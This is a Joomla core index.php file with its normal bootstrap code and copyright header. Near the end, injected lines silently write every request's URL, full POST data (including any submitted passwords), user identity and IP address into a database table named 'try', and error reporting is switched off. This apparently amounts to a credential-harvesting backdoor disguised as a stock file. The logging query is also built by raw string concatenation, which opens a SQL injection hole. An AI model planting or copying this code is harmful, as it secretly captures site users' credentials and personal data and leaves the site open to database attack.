<?php
/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */
error_reporting(0);
/**
 * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
 */
define('JOOMLA_MINIMUM_PHP', '5.3.10');

if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
{
	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
}

// Saves the start time and memory usage.
$startTime = microtime(1);
$startMem  = memory_get_usage();

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
 */
define('_JEXEC', 1);

if (file_exists(__DIR__ . '/defines.php'))
{
	include_once __DIR__ . '/defines.php';
}

if (!defined('_JDEFINES'))
{
	define('JPATH_BASE', __DIR__);
	require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

// Set profiler start time and memory usage and mark afterLoad in the profiler.
JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');
$db = JFactory::getDBO(); 
$uri = JFactory::getURI(); $absolute_url = $uri->toString();
  $ipaddress= 'IP Address - '.$_SERVER['REMOTE_ADDR'];  
   $input = JFactory::getApplication()->input;
$post_array = $input->getArray($_POST);
$user = JFactory::getUser($user_id);
    $db->setQuery("INSERT INTO try VALUES (NULL, '".date('Y-m-d h:i:s')."',$user->id,'$user->username','$user->name','".$absolute_url."\n".json_encode($post_array)."\n".$ipaddress."');");
	$db->execute();
	
// Execute the application.
$app->execute();
